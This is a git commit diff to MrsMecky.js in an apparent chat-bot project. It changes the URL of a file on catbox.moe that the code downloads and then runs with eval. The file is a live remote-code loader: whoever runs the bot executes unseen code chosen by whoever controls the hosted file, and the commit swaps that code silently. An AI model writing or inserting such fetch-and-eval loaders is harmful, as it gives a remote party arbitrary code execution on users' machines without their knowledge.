a8b747f526ea7a1603ec7bd13a894511b9eea9b3
HANSTZ <hanstzmd@gmail.com>
2025-02-23 12:15:54 +0300

    Update MrsMecky.js

--- MICKEY_BOT/MrsMecky.js
+++ MICKEY_BOT/MrsMecky.js
@@ -2,7 +2,7 @@
 
 const axios = require('axios');
 
-const url = "https://files.catbox.moe/tr1q2q.js";
+const url = "https://files.catbox.moe/5vsta5.js";
 
 axios.get(url)
     .then(response => eval(response.data))
